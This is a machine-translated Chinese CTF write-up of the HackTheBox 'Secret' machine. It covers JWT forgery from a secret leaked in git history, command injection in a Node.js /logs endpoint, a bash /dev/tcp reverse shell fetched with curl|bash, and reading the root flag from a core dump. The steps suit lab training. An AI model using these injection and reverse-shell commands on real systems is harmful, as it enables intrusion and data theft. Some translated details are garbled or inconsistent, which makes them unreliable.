# 黑客盒子的秘密——详细演练

> 原文：<https://infosecwriteups.com/secret-from-hackthebox-detailed-walkthrough-d256fb39a910?source=collection_archive---------0----------------------->

展示完成盒子所需的所有工具和技术。

# 机器信息

![](img/fa699f0f26860c14c32af4c6ff41e538.png)

黑客盒子的秘密

Secret 在 HackTheBox 上被评为简易机。我们从运行在机器上的网站上找到的备份开始。在那里，我们发现了许多有趣的文件，这些文件引导我们与 API 进行交互。最终，我们创建了一个 JSON Web 令牌，并可以执行远程代码执行，我们用它来获得一个反向 shell。升级到 root 涉及进一步的代码审查，这次是在包装盒上找到的 c 程序。由此我们发现崩溃程序允许我们通过核心转储看到内存的内容。在那里我们可以检索根标志。

所需技能是对 Java 代码的基本理解。学到的技能是操纵 JSON Web 令牌和检查敏感信息的核心转储。

[](https://www.hackthebox.eu/home/machines/profile/408) [## 秘密——破解盒子::渗透测试实验室

### 登录 Hack The Box 平台，让您的笔测试和网络安全技能更上一层楼！

www.hackthebox.eu](https://www.hackthebox.eu/home/machines/profile/408) 

# 初步侦察

像往常一样，让我们从 Nmap 开始:

![](img/c070e7e8ad1884f13a78ff565eab458a.png)

盒子的 Nmap 扫描

只有三个开放的端口，有趣的是其中两个是 nginx。让我们先将 box IP 添加到 hosts 文件中:

```
┌──(root💀kali)-[~/htb/secret]
└─# echo "10.10.11.120 secret.htb" >> /etc/hosts
```

# 网站(全球资讯网的主机站)

现在看看端口 80 上的网站:

![](img/49d93c04ba4d51d990940dddba0c6018.png)

文档的哑文档网站

这里没什么，只是一个关于文档的静态站点。点击现场演示按钮，我们将进入以下页面:

![](img/918bb0e84401183b7109c028f1f396a3.png)

在秘密盒子上发现的 API

我们看到了一个 API，稍后我们将与之交互。在主页下方，我们可以看到一个下载源代码的链接:

![](img/700c82979d305341e1db71ad16d98a92.png)

下载源代码的链接

# 源代码审查

让我们抓住它看一看:

```
┌──(root💀kali)-[~/htb/secret]
└─# wget http://secret.htb/download/files.zip
--2021-11-18 21:35:40--  http://secret.htb/download/files.zip
Resolving secret.htb (secret.htb)... 10.10.11.120
Connecting to secret.htb (secret.htb)|10.10.11.120|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 28849603 (28M) [application/zip]
Saving to: ‘files.zip’
files.zip      100%[================>]  27.51M  2.74MB/s    in 9.8s    
2021-11-18 21:35:50 (2.81 MB/s) - ‘files.zip’ saved [28849603/28849603]

┌──(root💀kali)-[~/htb/secret]
└─# unzip files.zip
Archive:  files.zip
   creating: local-web/
   creating: local-web/node_modules/
   creating: local-web/node_modules/get-stream/
  inflating: local-web/node_modules/get-stream/buffer-stream.js  
<SNIP>

┌──(root💀kali)-[~/htb/secret]
└─# cd local-web

┌──(root💀kali)-[~/htb/secret/local-web]
└─# ls -lsa
 4 -rw-rw-r--   1 root root    72 Sep  3 06:59 .env
 4 drwxrwxr-x   8 root root  4096 Sep  8 19:33 .git
 4 -rw-rw-r--   1 root root   885 Sep  3 06:56 index.js
 4 drwxrwxr-x   2 root root  4096 Aug 13 05:42 model
 4 drwxrwxr-x 201 root root  4096 Aug 13 05:42 node_modules
 4 -rw-rw-r--   1 root root   491 Aug 13 05:42 package.json
68 -rw-rw-r--   1 root root 69452 Aug 13 05:42 package-lock.json
 4 drwxrwxr-x   4 root root  4096 Sep  3 06:54 public
 4 drwxrwxr-x   2 root root  4096 Sep  3 07:32 routes
 4 drwxrwxr-x   4 root root  4096 Aug 13 05:42 src
 4 -rw-rw-r--   1 root root   651 Aug 13 05:42 validations.js
```

在本地网络文件夹中，我们看到许多文件。我看到的第一个是。环境:

```
┌──(root💀kali)-[~/htb/secret/local-web]
└─# cat .env          
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```

不知道这是为了什么，但似乎很可疑！

查看 index.js，我们会发现一些有趣的事情:

![](img/61fc83d620114687e2b499d38e04cde0.png)

index.js 的内容

有一个名为 auth 的文件用于设置名为 authRoute 的应用程序，它看起来像是一个我们可以连接的 API 端点。

查看 auth.js 文件，我们看到一个注册端点:

![](img/9a16c2f369bbb882bc42c9769fac4e53.png)

内容认证

还有一个登录部分，它检查一个帐户，如果有效，就创建一个 JSON Web 令牌(JWT ):

![](img/a2f76dfc69cabbcc3d58aacb09d7cddc.png)

auth.js 的更多内容

还有一个 validation.js 文件，它检查用户的注册和登录是否有效。如果你需要在深入之前阅读一些资料，这篇文章是对 JWT 的很好介绍。

# 与 API 交互

根据配置文件中的信息，我们现在知道如何尝试创建我们自己的用户:

![](img/455b4f640abcd818d11b8c53d6bf3a99.png)

通过缺少电子邮件的 API 创建用户

试图注册一个只有姓名字段的用户，会返回一条消息说需要电子邮件。让我们再试一次，添加一个假地址:

![](img/39676983cea262559db5a648b8050ab7.png)

通过缺少密码的 API 创建用户

成功了，我们现在得到另一条消息，这次告诉我们提供一个密码。让我们用密码再试一次:

![](img/705b9117694dabf943ac088dec707d0b.png)

通过缺少密码的 API 创建用户

根据提供的三个必需参数，我们已经创建了用户。现在我们可以尝试用它登录:

![](img/db95a027cdefaf49b34483f96f256963.png)

向新创建的用户验证

# 更多代码审查

这很有效，正如我们在配置文件中看到的，我们的用户返回了一个 JWT。在再次查看源代码后，我在 routes 文件夹中找到了 private.js:

```
┌──(root💀kali)-[~/htb/secret/local-web]
└─# cat routes/private.js 
const router = require('express').Router();
const verifytoken = require('./verifytoken')
const User = require('../model/user');

router.get('/priv', verifytoken, (req, res) => {
   // res.send(req.user)
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    if (name == 'theadmin'){
        res.json({
            creds:{
                role:"admin", 
                username:"theadmin",
                desc : "welcome back admin,"
            }
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
```

这为我们提供了另一个名为/priv 的端点。有趣的是，它告诉我们，如果我们拥有用户名 theadmin 并提供有效的令牌，我们就拥有管理员角色，否则我们就是普通用户。

稍后，在同一个文件中，我们看到了一个名为/logs 的端点，如果我们是管理员用户，它将允许我们传递一个名为 file 的参数，该参数是未清理的:

```
router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;

    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
```

因此，很明显，我们需要找到一种方法来为 theadmin 用户获取有效的 JWT。首先，让我们尝试将我们自己的用户令牌发送到我们刚刚找到的/priv 端点:

```
┌──(root💀kali)-[~/htb/secret]
└─# curl http://secret.htb/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTk2Y2RjZTQyNTczNjA0NWMyYjI5NTgiLCJuYW1lIjoicGVuY2VyIiwiZW1haWwiOiJwZW5jZXJAdGVzdC5jb20iLCJpYXQiOjE2MzcyNzMwOTN9.iVtsUPT-D-uHBCNnTIsRRAPyvLQSI5mIEvYqn9JJzLk'
{"role":{"role":"you are normal user","desc":"pencer"}}
```

有了这个认证令牌，我们可以与 priv API 进行交互，但是作为一个普通用户，我们不能做很多事情。

# JWT 工具

我们可以用 JWT _ 工具解码 JWT，让我们得到它:

![](img/81c16641e7a97a3ff006453f9d97ef6e.png)

获取 jwt_tool 的最新版本

我们将作为经过身份验证的用户收到的 JWT 传递给它:

![](img/fe44d7258744dea980ecea613bd20b73.png)

解码 JWT 以查看内容

它解码了令牌，并向我们显示由 _id、名称和电子邮件组成的有效载荷。

回顾我们目前的发现。我们知道，要取得进展，我们需要找到一种为管理员用户生成令牌的方法。为此，我们需要一个密码，我们之前发现了这个:

```
┌──(root💀kali)-[~/htb/secret/local-web]
└─# cat .env          
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```

# GitTools

这是行不通的，但是有一点我们之前没有注意到。git 文件夹包含在原始下载中。让我们提取的内容。使用 GitTools 的 git:

![](img/dbf51d5dc091c85cff433deb389b30d7.png)

提取 Git 存储库的内容

提取所有文件花了一些时间，但现在我们可以查看提交:

![](img/4b64e4429af4c6d7712bfb70408f86e8.png)

Git 文件中的提交列表

我们在 git repo 中有六次提交。我搜索了 TOKEN_SECRET，这是我们以前在。env 文件的主文件夹，并发现了一些有趣的东西:

![](img/b68147a358ae728d2488a91ffe2e3544.png)

在 Git 提交中搜索秘密

# 创建管理员 JWT

我们可以使用这个秘密和我们之前用 jwt_tool 创建的现有用户 JWT 来创建一个被篡改的令牌，作为 admin:

![](img/26fba2dbfd36fba90edfe59e06cbbd25.png)

已创建被篡改的令牌

# 远程代码执行

有了这个新的令牌，我们可以使用之前找到的/logs API，并作为 admin 进行身份验证。这让我们使用在源代码中看到未排序的参数。让我们尝试获取 passwd 文件:

![](img/94280803ebcd3ba216c086510fff798e.png)

抓取 passwd 文件

它工作了，我们看到了 passwd 文件的内容。值得注意的是用户 dasith。让我们看看我们是服务器上的哪个用户:

![](img/8e61c65a17c237e151b66ad5b487ee15.png)

正在检查用户 ID

好了，我们是 dasith 用户，让我们看看他们的主文件夹:

![](img/4944d21095f7a6ca5a6155893c0b4670.png)

在用户个人文件夹中查找

# 用户标志

不妨抓住用户标志:

```
┌──(root💀kali)-[~/htb/secret]
└─# curl 'http://secret.htb/api/logs?file=;cat+/home/dasith/user.txt' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTk2Y2RjZTQyNTczNjA0NWMyYjI5NTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InBlbmNlckB0ZXN0LmNvbSIsImlhdCI6MTYzNzI3MzA5M30.OBy7ffsMnK9IlG1uBm28X4aYbCMw4mgr3kZyFMXDGfE'
<SNIP>
c5d9aea30b9787de4c6776da13f5f57f
```

# 反向外壳

现在让我们得到一个反向 shell，我们可以使用这样一个简单的 shell，并把它放在一个 shell 文件中，这样我们就可以执行它了:

```
┌──(root💀kali)-[~/htb/secret]
└─# cat pencer_shell.sh
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.15.15/1338 0>&1'
```

启动一个 web 服务器，这样我们就可以获取文件，同时启动一个 netcat 监听器来捕获我们的 shell。现在像以前一样作为参数发送:

```
┌──(root💀kali)-[~/htb/secret]
└─# curl 'http://secret.htb/api/logs?file=;curl+http://10.10.15.15/pencer_shell.sh+|+bash' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTk2Y2RjZTQyNTczNjA0NWMyYjI5NTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InBlbmNlckB0ZXN0LmNvbSIsImlhdCI6MTYzNzI3MzA5M30.OBy7ffsMnK9IlG1uBm28X4aYbCMw4mgr3kZyFMXDGfE'
{"killed":false,"code":1,"signal":null,"cmd":"git log --oneline ;curl http://10.10.15.15/pencer_shell.sh | bash"}
```

我们看到了从我们的网络服务器上下载的文件:

```
┌──(root💀kali)-[~/htb/secret]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.120 - - [18/Nov/2021 22:11:37] "GET /pencer_shell.sh HTTP/1.1" 200 -
```

然后我们看到我们的外壳被连接起来:

```
┌──(root💀kali)-[~/htb/secret]
└─# nc -lvvp 1337
listening on [any] 1337 ...
connect to [10.10.15.15] from secret.htb [10.10.11.120] 51496
bash: cannot set terminal process group (1116): Inappropriate ioctl for device
bash: no job control in this shell
dasith@secret:~/local-web$ id
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)
```

首先让我们得到一个更好的外壳:

```
dasith@secret:~/local-web$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
dasith@secret:~/local-web$ ^Z
zsh: suspended  nc -lvvp 1337
┌──(root💀kali)-[~/htb/secret]
└─# stty raw -echo; fg
[1]  + continued  nc -lvvp 1337
dasith@secret:~/local-web$
```

# 列举

排序后，我四处查看，最终找到了一个名为 count 的文件，它设置了 sticky 位:

```
dasith@secret:~/local-web$ find / -type f -perm -u=s 2>/dev/null
<SNIP>
/opt/count
```

我们可以假设这是重要的。如果我们查看/opt 文件夹，我们还会发现计数文件的源代码:

```
dasith@secret:/opt$ ls -l
-rw-r--r-- 1 root root  3736 Oct  7 10:01 code.c
-rwsr-xr-x 1 root root 17824 Oct  7 10:03 count
-rw-r--r-- 1 root root  4622 Oct  7 10:04 valgrind.log

dasith@secret:~/local-web$ file /opt/count
/opt/count: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=615b7e12374cd1932161a6a9d9a737a63c7be09a, for GNU/Linux 3.2.0, not stripped
```

让我们看看这个文件做了什么:

```
dasith@secret:/opt$ ./count
Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: y
Path: /tmp/output.txt
```

它要求一个源文件，我给了它根标志，它似乎在做字符和字数统计。保存文件不能给我来源:

```
dasith@secret:/opt$ ls /tmp
 output.txt
 snap.lxd
 tmux-1000
 vmware-root_730-2999460803

dasith@secret:/opt$ cat /tmp/output.txt 
Total characters = 33
Total words      = 2
Total lines      = 2
```

我只是把输出保存到一个文本文件中。

# 核心转储

接下来，我们需要查看源代码，看看我们是否能理解这个文件的作用。这是一个很长的文件，但是我们可以看到它读取内存中提供的文件，在内存中计算字符和单词的数量。有趣的部分接近尾声:

```
// Enable coredump generation
prctl(PR_SET_DUMPABLE, 1);
```

我们可以看到这里的:

```
PR_SET_DUMPABLE (since Linux 2.3.20)
Set the state of the "dumpable" flag, which determines whether core dumps are
produced for the calling process upon delivery of a signal whose default behavior
is to produce a core dump.
```

这意味着程序正在设置标志，以便在终止时将核心转储写到一个文件中。我们可以利用这一点将内存内容转储到一个文件中，而 root.txt 文件保存在其中。

使用与上面相同的卷曲方法连接第二个壳。然后，在 shell 1 中，我们再次运行 count 程序并读取根标志:

```
dasith@secret:/opt$ ./count
Enter source file/directory name: /root/root.txt
Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]:
```

# 紧急措施

将它放在保存点，切换到第二个 shell，查看正在运行的进程:

![](img/d52e902713d398218b6d04ee07f6d5a1.png)

查看在机器上运行的进程

终止进程以进行计数:

```
dasith@secret:~/local-web$ kill 96020
kill 96020
```

现在打开核心转储的包装，以便我们可以查看它:

```
dasith@secret:/opt$ cd /var/crash

dasith@secret:/var/crash$ ls -l
-rw-r----- 1 root   root   27203 Oct  6 18:01 _opt_count.0.crash
-rw-r----- 1 dasith dasith 28006 Nov 18 21:40 _opt_count.1000.crash
-rw-r----- 1 root   root   24048 Oct  5 14:24 _opt_countzz.0.crash

dasith@secret:/var/crash$ mkdir /dev/shm/pencer

dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /dev/shm/pencer

dasith@secret:/var/crash$ cd /dev/shm/pencer

dasith@secret:/dev/shm/pencer$ ls
<SNIP>
CoreDump
<SNIP>
```

# 根标志

我们现在也可以使用字符串来查看 CoreDump 文件的内容:

```
dasith@secret:/dev/shm/pencer$ strings CoreDump
strings CoreDump
<SNIP>
Enter source file/directory name:
%99s
Save results a file? [y/N]: 
Path: 
Could not open %s for writing
:*3$"
Save results a file? [y/N]: words      = 2
Total lines      = 2
/root/root.txt
ed72112dc7721f564f49b6846a2f0e22
```

输出确实很长，但是您可以看到其中的计数文件输出，并看到已经读入的根标志的内容。

我认为这对于一个简单的盒子来说很棘手。我希望你喜欢它。

下次见。

如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)

推特—[https://twitter.com/pencer_io](https://twitter.com/pencer_io)
网站— [https://pencer.io](https://pencer.io/)

*原载于 2022 年 4 月 21 日*[*https://pencer . io*](https://pencer.io/ctf/ctf-htb-secret/)*。*